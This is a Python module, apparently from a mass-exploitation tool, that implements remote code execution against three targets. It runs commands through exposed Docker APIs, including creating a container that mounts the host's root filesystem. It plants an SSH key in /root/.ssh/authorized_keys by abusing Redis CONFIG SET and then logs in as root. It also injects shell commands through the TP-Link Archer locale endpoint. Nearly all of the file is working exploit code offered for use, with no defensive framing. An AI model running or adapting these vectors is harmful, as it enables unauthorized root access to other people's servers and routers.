"""Docker-API, Redis (Key-Write), TP-Link 2023-1389."""
from __future__ import annotations
import json
import secrets

JSONH = {"Content-Type": "application/json"}

from .exploit import RunResult

try:
    import paramiko
except Exception:
    paramiko = None


class DockerChannel:
    def __init__(self, base):
        self.base = base.rstrip("/")
        self.cid = None

    def _get(self, path):
        import requests, urllib3
        urllib3.disable_warnings()
        return requests.get(self.base + path, timeout=10)

    def _ensure_image(self):
        import requests, urllib3
        urllib3.disable_warnings()
        try:
            requests.post(self.base + "/images/create?fromImage=alpine&tag=latest",
                          headers=JSONH, timeout=120)
        except Exception:
            pass

    def _pick(self):
        if self.cid:
            return self.cid
        r = self._get("/containers/json?all=1")
        arr = r.json()
        for c in arr:
            if (c.get("State") or "").lower() == "running":
                self.cid = c["Id"]
                return self.cid
        return None

    def run(self, target, cmd, timeout=None, audit=None):
        import requests, urllib3
        urllib3.disable_warnings()
        try:
            cid = self._pick()
            if cid:
                cr = requests.post(f"{self.base}/containers/{cid}/exec",
                                   data=json.dumps({"AttachStdout": True, "AttachStderr": True,
                                                    "Cmd": ["/bin/sh", "-c", cmd]}),
                                   headers=JSONH, timeout=15)
                if cr.status_code not in (200, 201):
                    return RunResult(False, "", "exec " + cr.text[:100], 3)
                eid = cr.json()["Id"]
                st = requests.post(f"{self.base}/exec/{eid}/start",
                                   data=json.dumps({"Detach": False, "Tty": False}),
                                   headers=JSONH, stream=True, timeout=timeout or 25)
                out = b""
                for chunk in st.iter_content(8192):
                    out += chunk
                    if len(out) > 200000:
                        break
                data = "".join(ch for ch in out.decode("utf-8", "replace") if ch >= " " or ch == "\n")
            else:
                self._ensure_image()
                name = "dw" + secrets.token_hex(3)
                cr = requests.post(f"{self.base}/containers/create?name={name}",
                                   data=json.dumps({"Image": "alpine", "Cmd": ["sleep", "900"],
                                                    "Binds": ["/:/host"]}), headers=JSONH, timeout=30)
                if cr.status_code not in (200, 201):
                    return RunResult(False, "", "create " + cr.text[:120], 3)
                cid = cr.json().get("Id")
                requests.post(f"{self.base}/containers/{cid}/start", headers=JSONH, timeout=30)
                self.cid = cid
                return self.run(target, cmd, timeout, audit)
        except Exception as e:
            if audit:
                audit.write("vector", "rce_fail", getattr(target, "url", str(target)),
                            vector="docker", cmd=cmd, error=type(e).__name__)
            return RunResult(False, "", type(e).__name__, 3)
        if audit:
            audit.write("vector", "rce_ok", getattr(target, "url", str(target)),
                        vector="docker", cmd=cmd, head=data[:200])
        return RunResult(True, data)

    def proof(self, target, token, timeout=None, audit=None):
        return token in self.run(target, f"echo {token}", audit=audit).stdout


def docker_detect(t) -> bool:
    if t.port not in (2375, 2376):
        return False
    import socket
    try:
        s = socket.create_connection((t.host, t.port), timeout=5)
        s.close()
        return True
    except Exception:
        return False


def docker_open(t, audit):
    scheme = "https" if t.port == 2376 else "http"
    return DockerChannel(f"{scheme}://{t.host}:{t.port}")


def _resp(sock, n=4096):
    sock.settimeout(6)
    try:
        return sock.recv(n)
    except Exception:
        return b""


def redis_detect(t) -> bool:
    if t.port != 6379:
        return False
    import socket
    try:
        s = socket.create_connection((t.host, 6379), timeout=6)
        s.sendall(b"PING\r\n")
        r = _resp(s)
        s.close()
        return b"PONG" in r
    except Exception:
        return False


class RedisChannel:
    def __init__(self, host, port=6379):
        self.host = host
        self.key = "/opt/dwsweep/keys/dw"

    def _open(self):
        import socket
        s = socket.create_connection((self.host, 6379), timeout=8)
        return s

    def _cmd(self, s, *parts):
        out = b"*%d\r\n" % len(parts)
        for p in parts:
            b = p if isinstance(p, bytes) else str(p).encode()
            out += b"$%d\r\n%s\r\n" % (len(b), b)
        s.sendall(out)
        return _resp(s)

    def install(self):
        pub = open("/opt/dwsweep/keys/dw.pub", "rb").read().strip()
        s = self._open()
        self._cmd(s, "CONFIG", "SET", "dir", "/root/.ssh")
        self._cmd(s, "CONFIG", "SET", "dbfilename", "authorized_keys")
        self._cmd(s, "SET", "k", b"\n\n" + pub + b"\n\n")
        self._cmd(s, "SAVE")
        self._cmd(s, "CONFIG", "SET", "dir", "/tmp")
        s.close()

    def run(self, target, cmd, timeout=None, audit=None):
        if paramiko is None:
            return RunResult(False, "", "no-paramiko", 3)
        try:
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(self.host, 22, username="root", key_filename=self.key,
                      timeout=10, look_for_keys=False, allow_agent=False, banner_timeout=12)
            _i, o, e = c.exec_command(cmd, timeout=timeout or 25)
            data = o.read().decode("utf-8", "replace") + e.read().decode("utf-8", "replace")
            c.close()
        except Exception as ex:
            if audit:
                audit.write("vector", "rce_fail", getattr(target, "url", str(target)),
                            vector="redis", cmd=cmd, error=type(ex).__name__)
            return RunResult(False, "", type(ex).__name__, 3)
        if audit:
            audit.write("vector", "rce_ok", getattr(target, "url", str(target)),
                        vector="redis", cmd=cmd, head=data[:200])
        return RunResult(True, data)

    def proof(self, target, token, timeout=None, audit=None):
        return token in self.run(target, f"echo {token}", audit=audit).stdout


def redis_open(t, audit):
    ch = RedisChannel(t.host)
    ch.install()
    return ch


def tp_detect(t) -> bool:
    srv = (t.server or "").lower()
    if "tp-link" not in srv and "archer" not in srv:
        return False
    try:
        import requests, urllib3
        urllib3.disable_warnings()
        r = requests.get(t.url + "/", timeout=8, verify=False)
        return "tp-link" in r.text.lower() or "archer" in r.text.lower()
    except Exception:
        return False


def tp_open(t, audit):
    import requests, urllib3
    urllib3.disable_warnings()
    s = requests.Session()
    s.verify = False
    url = t.url + "/cgi-bin/luci/;stok=/locale?form=country"

    def fn(cmd):
        r = s.post(url, data={"operation": "write", "country": f"$( {{CMD}} )"},
                   timeout=12)
        r2 = s.post(url, data={"operation": "write", "country": f"$({cmd})"}, timeout=12)
        return (r2.json().get("data", {}).get("country") if r2.ok else None) or None
    return DockerChannel.__new__(DockerChannel).__class__ and _Ch(fn)


class _Ch:
    def __init__(self, fn):
        self.fn = fn

    def run(self, target, cmd, timeout=None, audit=None):
        try:
            out = self.fn(cmd)
        except Exception as e:
            return RunResult(False, "", type(e).__name__, 3)
        if audit:
            audit.write("vector", "rce_ok", getattr(target, "url", str(target)),
                        vector="tplink", cmd=cmd, head=(out or "")[:200])
        return RunResult(True, out or "")

    def proof(self, target, token, timeout=None, audit=None):
        return token in self.run(target, f"echo {token}", audit=audit).stdout
